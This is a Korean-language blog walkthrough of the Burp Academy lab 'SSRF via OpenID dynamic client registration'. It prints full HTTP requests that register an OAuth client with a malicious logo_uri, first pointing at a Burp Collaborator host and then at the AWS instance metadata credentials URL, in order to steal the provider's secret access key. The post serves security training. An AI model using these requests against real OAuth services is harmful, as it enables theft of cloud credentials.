---
layout: post
title: "Burp Academy-OAuth 다섯번째 문제: SSRF via OpenID dynamic client registration"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, OAuth취약점]
toc: true
---

# 개요
- OAuth 2.0 인증에 관련된 취약점이다. 
- 취약점 설명 주소: https://portswigger.net/web-security/oauth/openid
- 문제 주소: https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration
- 난이도: PRACTITIONER (보통)

# 문제 설명
- 특정 등록 엔드포인트에서 클라이언트 어플리케이션을 마음대로 등록할 수 있다. 
- client의 특정 데이터가 OAuth 서비스에서 안전하게 사용되고 있지 않다. 따라서 SSRF가 가능하다. 
- SSRF공격을 통해 OAuth관리측에서 `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/`로 접속하도록 만들어서 OAuth 제공자의 클라우드 환경의 억세스키를 얻어내자. 
- wiener:peter로 로그인 가능하다. 

```
This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.

To solve the lab, craft an SSRF attack to access http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ and steal the secret access key for the OAuth provider's cloud environment.

You can log in to your own account using the following credentials: wiener:peter
```

※ 추가정보 (`http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` URL에 대해서)
- 해당 URL은 AWS EC2 등 클라우드 플랫폼에서 VM 인스턴스에 메타데이터를 제공하기 위한 것이다. EC2내부에서만 접근가능한 Private IP주소로 되어 있다. 
- AWS에서는 `Instance MetaData Service(IMDS)`라고 부른다. 버전1(IMDSv1)과 버전2(IMDSv2)가 있다. 버전2의 사용이 추천된다. 버전1에 비해 인증과정이 추가되어서 SSRF공격을 완화할 수 있기 때문이다. 랩 서버에서는 버전1이 사용되고 있다. 

# 풀이 

## 로그인 과정 살펴보기
이 웹 사이트는 소셜미디어 계정으로 OAuth로그인이 가능하다. 일단 먼저 주어진 크레덴셜로 로그인을 시도해본다. 로그인에 성공하면 다음과 같이 유저의 데이터에 앱이 접근하는 것을 허락할지를 물어보는 팝업이 나타난다. 

![](/images/burp-academy-oauth-5-7.png)

이 때, 웹 페이지를 보면 다음과 같은 식으로 클라이언트 앱에서 설정한 로고를 얻어오는 부분이 있다. 클라이언트 앱에서 설정한 로고를 유저가 얻어오는 부분으로 보인다. 

![](/images/burp-academy-oauth-5-8.png)


## OAuth 클라이언트 등록 엔드포인트를 찾고 앱 등록하기 
1. 공격목표는 웹사이트(클라이언트 앱)이 아니라 OAuth 서비스를 제공하는 서버이다. 클라이언트를 마음대로 등록할 수 있는 부분에서 취약점이 발생한다고 했다. 아마 OAuth서비스의 알려진 엔드포인트가 존재할 것이다. 취약점 설명에도 있었던 `/.well-known/openid-configuration`에 접속해본다. 그러자 다음과 같이 각종 정보를 확인할 수 있었다! (클라이언트 앱 서버가 아니라 OAuth서버에 존재한다.)

![openid설정정보](/images/burp-academy-oauth-5-1.png)

2. OAuth 클라이언트를 등록할 수 있는 엔드포인트에 대한 정보가 있는지 확인해본다. 조금살펴보면 `registration_endpoint` 가 있는 것을 알 수 있다. 여기가 클라이언트를 등록하는 엔드포인트로 보인다. 값은 `https://oauth-0a4400a30443221683df1da0021700d7.oauth-server.net/reg` 로 되어 있다. 

3. 임의의 클라이언트를 등록가능한지 확인해본다. 이 엔드포인트에 POST로 요청을 보내본다. 그러자 다음과 같이 400에러 응답이 회신되었다. 결과 페이지에서 `redirect_uris`라는 값이 필수값이라는 정보를 얻을 수 있었다. 

![등록실패응답페이지](/images/burp-academy-oauth-5-9.png) 

4. 요청헤더에 `Content-Type: application/json`를 추가한다. 그리고 `redirect_uris`의 값을 대충 만들어서 보내본다. 


```json
{
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ]
}
```

5. 그러면 201 Created 응답이 돌아온다! 등록된 클라이언트의 `client_id`와 `client_secret`등이 보인다. 이 것으로 이 OAuth사이트에서 임의의 클라이언트를 등록할 수 있게 되었다. 

![201 Created 응답](/images/burp-academy-oauth-5-10.png)

## 로고 URL을 추가해서 등록해보기 
그런데 등록된 클라이언트 정보에서 로고와 관련된 URL은 보이지 않았다. 로고는 어떻게 등록할 수 있을까? OpenID Connect스펙에서는 클라이언트 로고 등록을 위해서 `logo_uri`를 정의하고 있다. 이 것을 사용할 수 있을지도 모른다. 등록이 가능한지 테스트해본다. 등록이 가능한 것을 확인할 수 있다. 

![201 Created 응답](/images/burp-academy-oauth-5-11.png)


## 로고URL에 접근이 발생하는지 테스트해보기 
임의의 `logo_uri`를 설정할 수 있는 것을 알았다. 그러면 이 것을 사용해서 SSRF가 가능한지를 확인해본다. `logo_uri`를 burp collaborator의 URL로 설정해서 등록한다. 

![201 Created 응답](/images/burp-academy-oauth-5-12.png)

```http
POST /reg HTTP/2
Host: oauth-0aeb008904f275c282c8f5f8020a000a.oauth-server.net
Cookie: session=BkE5nKWI93hODS25zW0pnCEnjgid5y2A
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7
Content-Type: application/json
Content-Length: 200

{
    "redirect_uris": [
        "https://client-app.com/callback",
        "https://client-app.com/callback2"
        ],
"logo_uri":     "https://2svu53q0b6bu7qnyzn63pmp9o0urih66.oastify.com"
}
```

그러면 이어서 클라이언트의 로고를 확인하는 엔드포인트로 요청을 보내본다. `GET /client/{client_id}/logo`이다. 다음과 같이 200응답이 확인된다. 

![클라이언트 logo 확인](/images/burp-academy-oauth-5-13.png)

Burp Collaborator를 보면 요청이 들어온 것이 확인된다. 이를 통해 로고 취득 요청이 있으면 OAuth 서버에서 해당 로고URL로 접근한다는 것이 확인되었다. 즉, SSRF가 가능한 것이다. 

![Burp Collaborator확인](/images/burp-academy-oauth-5-5.png)

## Exploit 
필요한 모든 확인이 끝났으므로 exploit을 수행할 차례다. logo_uri 를 메타정보 확인용 URL(IMDS URL)로 변경해서 클라이언트를 등록한다. 이렇게 하면 로고를 요청했을 때, OAuth 서버에서 logo_uri에 등록된 IMDS URL로 요청을 보낸 결과가 회신될 것이다! 

```http
POST /reg HTTP/2
Host: oauth-0a4800c8035868288387f4cf025400da.oauth-server.net
Cookie: _interaction_resume=uV07SPBdCw3WnAMpsiTQk; _session=Xl4vrLAPKwjf6ZFGy53J3; _session.legacy=Xl4vrLAPKwjf6ZFGy53J3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json

{
  "redirect_uris" : ["https://example.com"],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

로고를 요청하면 OAuth 서버의 시크릿키가 회신된다! 

![OAuth서버의 시크릿키확인](/images/burp-academy-oauth-5-14.png)

랩 서버에서 Submit Solution버튼을 누르고, 확인된 SecretAccessKey를 제출하면 랩이 풀린다. 

![성공](/images/burp-academy-oauth-5-success.png)